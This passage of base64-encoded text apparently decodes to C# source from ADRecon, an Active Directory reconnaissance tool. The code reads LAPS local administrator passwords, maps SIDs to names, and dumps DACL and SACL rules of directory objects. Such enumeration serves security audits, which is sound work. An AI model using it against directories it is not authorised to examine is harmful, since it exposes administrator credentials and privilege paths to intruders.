YXNzd29yZCIsIEFkQ29tcHV0ZXIuTWVtYmVyc1sibXMtTWNzLUFkbVB3ZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgTEFQU09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkV4cGlyYXRpb24iLCBDdXJyZW50RXhwaXJhdGlvbikpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IExBUFNPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgU0lEUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRPYmplY3QgPSAoUFNPYmplY3QpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuTWVtYmVyc1siT2JqZWN0Q2xhc3MiXS5WYWx1ZSkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VyIjoKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiY29tcHV0ZXIiOgogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJncm91cCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBRFdTQ2xhc3MuQWRTSUREaWN0aW9uYXJ5LkFkZChDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0Lk1lbWJlcnNbIm9iamVjdHNpZCJdLlZhbHVlKSwgQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5NZW1iZXJzWyJOYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gezF9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgKChQU09iamVjdCkgcmVjb3JkKS5NZW1iZXJzWyJPYmplY3RDbGFzcyJdLlZhbHVlLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBEQUNMUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZE9iamVjdCA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBOYW1lID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgVHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgTGlzdDxQU09iamVjdD4gREFDTExpc3QgPSBuZXcgTGlzdDxQU09iamVjdD4oKTsKCiAgICAgICAgICAgICAgICAgICAgTmFtZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuTWVtYmVyc1siTmFtZSJdLlZhbHVlKTsKCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoIChDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0Lk1lbWJlcnNbIm9iamVjdENsYXNzIl0uVmFsdWUpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIlVzZXIiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNvbXB1dGVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiQ29tcHV0ZXIiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiR3JvdXAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNvbnRhaW5lciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkNvbnRhaW5lciI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZ3JvdXBQb2xpY3lDb250YWluZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJHUE8iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuTWVtYmVyc1siRGlzcGxheU5hbWUiXS5WYWx1ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAib3JnYW5pemF0aW9uYWxVbml0IjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiT1UiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImRvbWFpbkROUyI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkRvbWFpbiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSBDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0Lk1lbWJlcnNbIm9iamVjdENsYXNzIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAvLyBXaGVuIHRoZSB1c2VyIGlzIG5vdCBhbGxvd2VkIHRvIHF1ZXJ5IHRoZSBudHNlY3VyaXR5ZGVzY3JpcHRvciBhdHRyaWJ1dGUuCiAgICAgICAgICAgICAgICAgICAgaWYgKEFkT2JqZWN0Lk1lbWJlcnNbIm50c2VjdXJpdHlkZXNjcmlwdG9yIl0gIT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERpcmVjdG9yeU9iamVjdFNlY3VyaXR5IERpck9ialNlYyA9IChEaXJlY3RvcnlPYmplY3RTZWN1cml0eSkgQWRPYmplY3QuTWVtYmVyc1sibnRzZWN1cml0eWRlc2NyaXB0b3IiXS5WYWx1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0aG9yaXphdGlvblJ1bGVDb2xsZWN0aW9uIEFjY2Vzc1J1bGVzID0gKEF1dGhvcml6YXRpb25SdWxlQ29sbGVjdGlvbikgRGlyT2JqU2VjLkdldEFjY2Vzc1J1bGVzKHRydWUsdHJ1ZSx0eXBlb2YoU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSBSdWxlIGluIEFjY2Vzc1J1bGVzKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmcgSWRlbnRpdHlSZWZlcmVuY2UgPSBDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuSWRlbnRpdHlSZWZlcmVuY2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE93bmVyID0gQ29udmVydC5Ub1N0cmluZyhEaXJPYmpTZWMuR2V0T3duZXIodHlwZW9mKFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgT2JqZWN0T2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQ2xlYW5TdHJpbmcoTmFtZSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlR5cGUiLCBUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPYmplY3RUeXBlTmFtZSIsIEFEV1NDbGFzcy5HVUlEc1tDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuT2JqZWN0VHlwZSldKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0ZWRPYmplY3RUeXBlTmFtZSIsIEFEV1NDbGFzcy5HVUlEc1tDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuSW5oZXJpdGVkT2JqZWN0VHlwZSldKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY3RpdmVEaXJlY3RvcnlSaWdodHMiLCBSdWxlLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjZXNzQ29udHJvbFR5cGUiLCBSdWxlLkFjY2Vzc0NvbnRyb2xUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJZGVudGl0eVJlZmVyZW5jZU5hbWUiLCBBRFdTQ2xhc3MuQWRTSUREaWN0aW9uYXJ5LkNvbnRhaW5zS2V5KElkZW50aXR5UmVmZXJlbmNlKSA/IEFEV1NDbGFzcy5BZFNJRERpY3Rpb25hcnlbSWRlbnRpdHlSZWZlcmVuY2VdIDogSWRlbnRpdHlSZWZlcmVuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk93bmVyTmFtZSIsIEFEV1NDbGFzcy5BZFNJRERpY3Rpb25hcnkuQ29udGFpbnNLZXkoT3duZXIpID8gQURXU0NsYXNzLkFkU0lERGljdGlvbmFyeVtPd25lcl0gOiBPd25lcikpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkIiwgUnVsZS5Jc0luaGVyaXRlZCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0RmxhZ3MiLCBSdWxlLk9iamVjdEZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZUZsYWdzIiwgUnVsZS5Jbmhlcml0YW5jZUZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZVR5cGUiLCBSdWxlLkluaGVyaXRhbmNlVHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJvcGFnYXRpb25GbGFncyIsIFJ1bGUuUHJvcGFnYXRpb25GbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0VHlwZSIsIFJ1bGUuT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkT2JqZWN0VHlwZSIsIFJ1bGUuSW5oZXJpdGVkT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSWRlbnRpdHlSZWZlcmVuY2UiLCBSdWxlLklkZW50aXR5UmVmZXJlbmNlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPd25lciIsIE93bmVyKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIEFkT2JqZWN0Lk1lbWJlcnNbIkRpc3Rpbmd1aXNoZWROYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERBQ0xMaXN0LkFkZCggT2JqZWN0T2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiBEQUNMTGlzdC5Ub0FycmF5KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgY2xhc3MgU0FDTFJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRPYmplY3QgPSAoUFNPYmplY3QpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgTmFtZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIFR5cGUgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIExpc3Q8UFNPYmplY3Q+IFNBQ0xMaXN0ID0gbmV3IExpc3Q8UFNPYmplY3Q+KCk7CgogICAgICAgICAgICAgICAgICAgIE5hbWUgPSBDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0Lk1lbWJlcnNbIk5hbWUiXS5WYWx1ZSk7CgogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5NZW1iZXJzWyJvYmplY3RDbGFzcyJdLlZhbHVlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVzZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJVc2VyIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJjb21wdXRlciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkNvbXB1dGVyIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJncm91cCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkdyb3VwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJjb250YWluZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJDb250YWluZXIiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImdyb3VwUG9saWN5Q29udGFpbmVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiR1BPIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSBDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0Lk1lbWJlcnNbIkRpc3BsYXlOYW1lIl0uVmFsdWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgIm9yZ2FuaXphdGlvbmFsVW5pdCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIk9VIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJkb21haW5ETlMiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJEb21haW4iOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5NZW1iZXJzWyJvYmplY3RDbGFzcyJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgLy8gV2hlbiB0aGUgdXNlciBpcyBub3QgYWxsb3dlZCB0byBxdWVyeSB0aGUgbnRzZWN1cml0eWRlc2NyaXB0b3IgYXR0cmlidXRlLgogICAgICAgICAgICAgICAgICAgIGlmIChBZE9iamVjdC5NZW1iZXJzWyJudHNlY3VyaXR5ZGVzY3JpcHRvciJdICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBEaXJlY3RvcnlPYmplY3RTZWN1cml0eSBEaXJPYmpTZWMgPSAoRGlyZWN0b3J5T2JqZWN0U2VjdXJpdHkpIEFkT2JqZWN0Lk1lbWJlcnNbIm50c2VjdXJpdHlkZXNjcmlwdG9yIl0uVmFsdWU7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhvcml6YXRpb25SdWxlQ29sbGVjdGlvbiBBdWRpdFJ1bGVzID0gKEF1dGhvcml6YXRpb25SdWxlQ29sbGVjdGlvbikgRGlyT2JqU2VjLkdldEF1ZGl0UnVsZXModHJ1ZSx0cnVlLHR5cGVvZihTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCkpOwogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChBY3RpdmVEaXJlY3RvcnlBdWRpdFJ1bGUgUnVsZSBpbiBBdWRpdFJ1bGVzKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBPYmplY3RPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBDbGVhblN0cmluZyhOYW1lKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVHlwZSIsIFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk9iamVjdFR5cGVOYW1lIiwgQURXU0NsYXNzLkdVSURzW0NvbnZlcnQuVG9TdHJpbmcoUnVsZS5PYmplY3RUeXBlKV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkluaGVyaXRlZE9iamVjdFR5cGVOYW1lIiwgQURXU0NsYXNzLkdVSURzW0NvbnZlcnQuVG9TdHJpbmcoUnVsZS5Jbmhlcml0ZWRPYmplY3RUeXBlKV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyIsIFJ1bGUuQWN0aXZlRGlyZWN0b3J5UmlnaHRzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJZGVudGl0eVJlZmVyZW5jZSIsIFJ1bGUuSWRlbnRpdHlSZWZlcmVuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkF1ZGl0RmxhZ3MiLCBSdWxlLkF1ZGl0RmxhZ3MpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk9iamVjdEZsYWdzIiwgUnVsZS5PYmplY3RGbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGFuY2VGbGFncyIsIFJ1bGUuSW5oZXJpdGFuY2VGbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGFuY2VUeXBlIiwgUnVsZS5Jbmhlcml0YW5jZVR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkluaGVyaXRlZCIsIFJ1bGUuSXNJbmhlcml0ZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByb3BhZ2F0aW9uRmxhZ3MiLCBSdWxlLlByb3BhZ2F0aW9uRmxhZ3MpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk9iamVjdFR5cGUiLCBSdWxlLk9iamVjdFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkluaGVyaXRlZE9iamVjdFR5cGUiLCBSdWxlLkluaGVyaXRlZE9iamVjdFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNBQ0xMaXN0LkFkZCggT2JqZWN0T2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiBTQUNMTGlzdC5Ub0FycmF5KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vVGhlIGludGVyZmFjZSBhbmQgaW1wbG1lbnRhdGlvbiBjbGFzcyB1c2VkIHRvIGhhbmRsZSB0aGUgcmVzdWx0cyAodGhpcyBpbXBsZW1lbnRhdGlvbiBqdXN0IHdyaXRlcyB0aGUgc3RyaW5ncyB0byBhIGZpbGUpCgogICAgICAgIGludGVyZmFjZSBJUmVzdWx0c0hhbmRsZXIKICAgICAgICB7CiAgICAgICAgICAgIHZvaWQgcHJvY2Vzc1Jlc3VsdHMoT2JqZWN0W10gdCk7CgogICAgICAgICAgICBPYmplY3RbXSBmaW5hbGlzZSgpOwogICAgICAgIH0KCiAgICAgICAgY2xhc3MgU2ltcGxlUmVzdWx0c0hhbmRsZXIgOiBJUmVzdWx0c0hhbmRsZXIKICAgICAgICB7CiAgICAgICAgICAgIHByaXZhdGUgT2JqZWN0IGxvY2tPYmogPSBuZXcgT2JqZWN0KCk7CiAgICAgICAgICAgIHByaXZhdGUgTGlzdDxPYmplY3Q+IHByb2Nlc3NlZCA9IG5ldyBMaXN0PE9iamVjdD4oKTsKCiAgICAgICAgICAgIHB1YmxpYyBTaW1wbGVSZXN1bHRzSGFuZGxlcigpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcHVibGljIHZvaWQgcHJvY2Vzc1Jlc3VsdHMoT2JqZWN0W10gcmVzdWx0cykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgbG9jayAobG9ja09iaikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBpZiAocmVzdWx0cy5MZW5ndGggIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcmVzdWx0cy5MZW5ndGg7IGkrKykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2Vzc2VkLkFkZCgoUFNPYmplY3QpcmVzdWx0c1tpXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHB1YmxpYyBPYmplY3RbXSBmaW5hbGlzZSgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybiBwcm9jZXNzZWQuVG9BcnJheSgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CiJACgokTERBUFNvdXJjZSA9IEAiCi8vIFRoYW5rcyBEZW5uaXMgQWxidXF1ZXJxdWUgZm9yIHRoZSBDIyBtdWx0aXRocmVhZGluZyBjb2RlCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOwp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CnVzaW5nIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2w7CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb247CgpuYW1lc3BhY2UgQURSZWNvbgp7CiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIExEQVBDbGFzcwogICAgewogICAgICAgIHByaXZhdGUgc3RhdGljIERhdGVUaW1lIERhdGUxOwogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBQYXNzTWF4QWdlOwogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBEb3JtYW50VGltZVNwYW47CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgRGljdGlvbmFyeTxTdHJpbmcsIFN0cmluZz4gQWRHcm91cERpY3Rpb25hcnkgPSBuZXcgRGljdGlvbmFyeTxTd